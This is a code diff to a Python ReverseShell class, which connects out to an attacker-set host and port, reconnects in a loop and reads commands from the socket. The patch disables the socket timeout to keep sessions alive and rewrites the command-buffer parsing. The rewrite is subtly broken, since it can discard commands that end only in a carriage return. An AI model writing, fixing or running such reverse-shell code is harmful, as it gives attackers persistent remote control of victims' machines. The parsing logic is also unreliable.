@@ -29,6 +29,7 @@ class ReverseShell:
         while self.running:
             try:
                 self.sock = socket.create_connection((HOST, PORT), timeout=10)
+                self.sock.settimeout(None)  # <--- ADD THIS LINE
                 self.handle_session()
             except (ConnectionRefusedError, TimeoutError):
                 time.sleep(RECONNECT_DELAY)
@@ -42,21 +43,20 @@ class ReverseShell:
     def handle_session(self):
         """Main command session handler with keep-alive"""
         try:
-            self.buffer = b''  # Initialize buffer for partial commands
+            self.buffer = b''
             while self.running:
-                # Check buffer first before recv
+                # Check buffer for existing commands
                 if b'\n' in self.buffer or b'\r\n' in self.buffer:
-                    # Extract command from buffer
-                    command, sep, remaining = self.buffer.partition(b'\n')
-                    if not sep:  # Try \r\n partition
-                        command, sep, remaining = self.buffer.partition(b'\r\n')
-                    self.buffer = remaining
+                    # Extract command
+                    command, sep, self.buffer = self.buffer.partition(b'\n')
+                    if not sep:  # Handle \r\n
+                        command, sep, self.buffer = self.buffer.partition(b'\r\n')
                     command = command.decode(ENCODING).strip()
                 else:
-                    # Get more data from network
+                    # Wait for data without timeout
                     data = self.sock.recv(BUFFER_SIZE)
                     if not data:
-                        break
+                        break  # Connection closed
                     self.buffer += data
                     continue
 
